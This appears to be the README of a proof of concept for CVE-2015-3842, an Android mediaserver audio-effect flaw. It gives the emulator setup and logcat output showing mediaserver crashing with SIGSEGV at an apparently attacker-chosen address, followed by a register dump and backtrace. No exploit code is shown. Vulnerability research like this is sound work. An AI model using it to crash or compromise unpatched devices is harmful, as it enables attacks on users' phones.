poc of CVE-2015-3842

reference: http://blog.trendmicro.com/trendlabs-security-intelligence/mediaserver-takes-another-hit-with-latest-android-vulnerability/

I debug in emulator, 5.1, x86, android-22

the output of logcat info :

I/AudioEffectPOC( 1873): ptr = 0xffffffffb4082b00
I/AudioEffectPOC( 1873): return = 0x0
--------- beginning of crash
F/libc    (  933): Fatal signal 11 (SIGSEGV), code 1, fault addr 0x77777783 in tid 1217 (AudioOut_2)
I/GenericSource(  933): start
I/Choreographer( 1353): Skipped 34 frames!  The application may be doing too much work on its main thread.
I/DEBUG   (  930): *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
I/DEBUG   (  930): Build fingerprint: 'generic_x86/sdk_phone_x86/generic_x86:5.1/LKY45/1737576:eng/test-keys'
I/DEBUG   (  930): Revision: '0'
I/DEBUG   (  930): ABI: 'x86'
I/DEBUG   (  930): pid: 933, tid: 1217, name: AudioOut_2  >>> /system/bin/mediaserver <<<
I/DEBUG   (  930): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x77777783
W/NativeCrashListener( 1222): Couldn't find ProcessRecord for pid 933
I/DEBUG   (  930):     eax 00000016  ebx b76057a8  ecx 00000000  edx 00000003
E/DEBUG   (  930): AM write failure (32 / Broken pipe)
I/DEBUG   (  930):     esi 77777783  edi 77777777
I/DEBUG   (  930):     xcs 00000073  xds 0000007b  xes 0000007b  xfs 00000000  xss 0000007b
I/DEBUG   (  930):     eip b754d363  ebp 77777783  esp b55bfb80  flags 00010202
I/DEBUG   (  930):
I/DEBUG   (  930): backtrace:
I/DEBUG   (  930):     #00 pc 00022363  /system/lib/libc.so (pthread_mutex_lock+35)
I/DEBUG   (  930):     #01 pc 0005332b  /system/lib/libaudioflinger.so
I/DEBUG   (  930):     #02 pc 00037548  /system/lib/libaudioflinger.so
I/DEBUG   (  930):     #03 pc 000169de  /system/lib/libutils.so (android::Thread::_threadLoop(void*)+398)
I/DEBUG   (  930):     #04 pc 000160fa  /system/lib/libutils.so (thread_data_t::trampoline(thread_data_t const*)+122)
I/DEBUG   (  930):     #05 pc 000211a8  /system/lib/libc.so (__pthread_start(void*)+56)
I/DEBUG   (  930):     #06 pc 0001c529  /system/lib/libc.so (__start_thread+25)
I/DEBUG   (  930):     #07 pc 000130f6  /system/lib/libc.so (__bionic_clone+70)
